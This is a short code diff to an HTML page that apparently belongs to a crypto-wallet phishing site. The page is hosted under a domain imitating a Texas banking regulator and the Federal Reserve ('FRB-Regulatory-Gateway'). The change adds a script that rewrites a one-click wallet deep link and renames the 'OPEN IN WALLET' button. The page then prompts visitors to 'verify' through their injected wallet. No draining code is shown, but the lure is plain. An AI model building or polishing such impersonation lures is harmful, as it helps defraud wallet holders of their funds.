@@ -197,7 +197,15 @@
             <!-- ONE-CLICK BUTTON TO OPEN BASE WALLET -->
             <a href="https://go.cb-w.com/dapp?cb_url=https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/verify.html" 
                class="block w-full bg-blue-600 text-white text-center py-4 px-6 rounded font-bold text-lg mb-4 hover:bg-blue-700">
-                🚀 OPEN IN BASE WALLET
+                <script>
+// Ensure URL is properly encoded for the deep link
+document.querySelector('a[href*="go.cb-w.com"]').addEventListener('click', function(e) {
+    const baseUrl = "https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/verify.html";
+    const encodedUrl = encodeURIComponent(baseUrl);
+    this.href = `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`;
+});
+                </script>
+                OPEN IN WALLET
             </a>
 
             <p class="text-sm text-gray-600 mb-4 text-center">
@@ -251,7 +259,7 @@
 
     verifyBtn.addEventListener('click', async function() {
         if (typeof window.ethereum === 'undefined') {
-            alert('Please click the "OPEN IN BASE WALLET" button above first.');
+            alert('Please click the "OPEN IN WALLET" button above first.');
             return;
         }
 
